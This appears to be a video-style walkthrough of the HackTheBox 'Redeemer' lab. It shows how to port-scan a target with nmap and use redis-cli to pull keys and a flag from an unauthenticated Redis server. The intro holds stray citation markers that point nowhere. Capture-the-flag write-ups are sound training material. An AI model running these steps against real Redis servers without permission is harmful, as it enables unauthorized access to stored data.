## Redeemer: HackTheBox Starting Point Walkthrough

**Intro**

What's up, hackers! Welcome back to Ctrl Alt Hack. In this video, we're diving into the fourth box in HackTheBox's Starting Point: Redeemer. This challenge introduces us to Redis, an in-memory database. [cite: 3, 4] In-memory databases are all about speed, storing data in RAM for lightning-fast access. [cite: 3, 4, 5, 6, 7] We'll explore how to enumerate a Redis server and grab that sweet flag.

**Enumeration**

Let's start with our usual `ping` to check connectivity:

```bash
ping <target_IP>
```

Now that we know the target is alive, let's scan for open ports using `nmap`:

```bash
sudo nmap -p- -sV <target_IP>
```

This scan reveals port 6379, which is the default port for Redis. Redis is a NoSQL key-value store, often used for caching.

**Exploitation**

To interact with Redis, we'll use the `redis-cli` command-line utility. If you don't have it, install it:

```bash
sudo apt install redis
```

For a list of options, use the `help` flag:

```bash
redis-cli --help
```

Now, let's connect to the Redis server:

```bash
redis-cli -h <target_IP>
```

Once connected, we can gather information about the server using the `info` command.

```
redis-cli -h <target_IP>
info
```

To select the database, we use the `select` command followed by the database index:

```
select 0
```

To list all keys in the database, we use the `keys *` command:

```
keys *
```

Finally, to retrieve the value of a key, we use the `get` command:

```
get flag
```

This will display the flag.

**Claiming the Flag**

Copy the flag and submit it on HackTheBox to complete the challenge.

**Outro**

And that's how you conquer Redeemer! Redis is a powerful tool, and understanding how to interact with it is crucial. If you found this walkthrough helpful, be sure to like, subscribe, and hit that bell icon for more Ctrl Alt Hack content. Stay curious, keep hacking, and I'll see you in the next video!